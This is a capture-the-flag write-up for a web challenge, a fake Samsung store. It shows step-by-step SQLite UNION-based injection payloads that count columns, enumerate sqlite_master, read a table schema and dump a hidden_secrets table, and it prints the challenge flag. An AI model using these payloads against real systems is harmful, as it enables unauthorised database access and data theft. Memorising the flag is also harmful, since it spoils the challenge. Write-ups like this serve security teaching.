# Samsung Store — CTF Writeup

**Category:** Web  
**Points:** 50  
**Flag:** `SSCTF{s3cur3_y0ur_qu3r13s_0r_g3t_1nj3ct3d}`

---

## Overview

The challenge was a fake Samsung product store running at `http://4.188.84.14:7777/`. It had a search box to look up "Knox software and manuals". The goal was to find the hidden flag.

---

## Recon

First thing I did was look at the page source. The search worked via a GET request with a `search` parameter passed directly to the backend. No obvious client-side filtering.

Tried a single quote in the search box:

```
'
```

Got back a database error:

```
Database Error: unrecognized token: "'"
```

SQLite confirmed. The input was going straight into the query unsanitized.

---

## Exploitation

**Step 1 — confirm injection and find column count**

Tried `' OR '1'='1` — returned all products, so the injection was working.

Then tested UNION-based injection to figure out how many columns the query returns:

```
' UNION SELECT NULL,NULL,NULL,NULL--
```

No error on 4 NULLs, so the query returns 4 columns.

**Step 2 — enumerate tables**

```sql
' UNION SELECT name,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--
```

This returned the table list. Spotted an interesting one: `hidden_secrets`.

**Step 3 — get the schema**

```sql
' UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master WHERE name='hidden_secrets'--
```

Schema showed:

```sql
CREATE TABLE hidden_secrets (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  secret_key TEXT NOT NULL,
  value TEXT NOT NULL
)
```

**Step 4 — dump the table**

```sql
' UNION SELECT secret_key,value,NULL,NULL FROM hidden_secrets--
```

Flag was sitting right there in the results.

---

## Flag

```
SSCTF{s3cur3_y0ur_qu3r13s_0r_g3t_1nj3ct3d}
```


